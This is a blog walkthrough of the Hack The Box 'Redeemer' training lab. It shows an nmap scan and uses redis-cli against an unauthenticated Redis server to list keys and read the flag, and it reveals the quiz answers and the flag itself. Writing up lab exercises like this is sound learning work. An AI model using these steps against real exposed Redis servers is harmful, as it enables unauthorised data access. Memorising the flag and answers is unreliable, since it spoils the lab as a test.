---
title: "Redeemer Walkthrough HTB"
layout: post
categories:
    - Hack The Box
    - Tier 0
---

Redis is an open source (BSD licensed), in-memory data structure store used as a database, cache, message broker, and streaming engine. Redis provides data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes, and streams. Redis has built-in replication, Lua scripting, LRU eviction, transactions, and different levels of on-disk persistence, and provides high availability via Redis Sentinel and automatic partitioning with Redis Cluster.


---

💻️ The Target Machine is : 10.129.61.157

---

A tip I would suggest, if you don't want to constantly retype the IP address you can opt to export the address to a variable whose name can be of your chosing. 
In turn you can call the variable as `$[variableName]` the **$** is important.
Consider the command below:
```
-$ export IP=10.129.61.157 
```
The command is entered directly into the terminal that would be currently running and will be only active in that terminal.
To test the command:
```
-$ echo $IP
10.129.61.157
```

### Answering HTB Questions 

> Which TCP port is open on the machine? 
>> 6379

>  Which service is running on the port that is open on the machine? 
>> redis

>  What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database 
>> In-memory database

[**In-memory database**]() is a database that keeps data in the main memory aka RAM, therefore each time you query the DB or even update the DB then you basically access the main memory. There is no secondary memory usage in the operations. Hence, if the machine crashes the data is lost.

>  Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. 
>> Redis-cli

>  Which flag is used with the Redis command-line utility to specify the hostname? 
>> -h

>  Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? 
>> INFO

>  What is the version of the Redis server being used on the target machine? 
>> 5.0.7

>  Which command is used to select the desired database in Redis? 
>> select

I wrote `select` because it is usually the go to command to access databases and tables more so when using SQL.
Up to this point I basically used help command to figure things out and move around, but I haven't been able to view the databases that are available let alone the tables.
The onlything to do now is research on redis and the system 😅️.

After an enourmous time of googling here is what I found.

> Redis provides you with 16 databases starting from index 0 to index 15. You can switch to a database using the select command as:
```
127.0.0.1:6379> select 1
OK
127.0.0.1:6379[1]>
```
Use [this](https://linuxhint.com/redis-cli/) for reference.

Also, Redis is a NO-SQL type of database system. So that would mean that it is a non-relational DB 🤔️.

A tip that I found was to use this [site](https://book.hacktricks.xyz/welcome/readme) it is called hacktricks, a wonderful resource for knowledge in terms of ctfs.

In-depth reference would be [cryptocat](https://www.youtube.com/watch?v=usZ78an3jXE&t=6s) video.

 
>  How many keys are present inside the database with index 0? 
>> 4



>  Which command is used to obtain all the keys in a database? 
>> keys *


## -------------------------| ENUMARATION PHASE |------------------------------

```
-$ sudo nmap -p- --min-rate 5000 -sV -sC $IP -v -oN scan.nmap 

---snip---

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

---snip---

```
**`-p-`** ==> scan all the 65535 ports.
**`-sV`** ==> Enumerate the version of the service that is open.
**`-sC`** ==> Use default scrips to enumerate certain things like the version, OS
**`-v`** ==> Show me everything that the tool is doing. Being verbose.
**`-oN`** ==> On a normal file output everything there hence the filename [scan.nmap]()

## ----------------------------| EXPLOITAION |---------------------------------

With what we have discovered we can try and gain foothold on the machine.

Okay let's put it all together, as shown below:
```
$ redis-cli -h $IP

10.129.61.157:6379> INFO

# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64

---snip---
```
The info command gives us details about the system.

```
10.129.61.157:6379> dbsize
(integer) 4
```
This just stated the size of the DB.
```
10.129.61.157:6379> info keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
To dump the whole database we use the command above, db0 basically denotes the index 0 which is a database. Notice that the number of keys are 4 and each key ought to have a value 🤔️.
```
10.129.61.157:6379> select 0
OK
10.129.61.157:6379> keys *
1) "numb"
2) "flag"
3) "temp"
4) "stor"
10.129.61.157:6379> get "flag"
"03e1d2b376c37ab3f5319922053953eb"
```
So I needed to select the database, which I did, there after list all the keys.
The * denotes list everything or include everything.
What is listed are basically keys and their data type is string.
To get the values you basically use the get command together with the key.

> Submit root flag
>> 03e1d2b376c37ab3f5319922053953eb
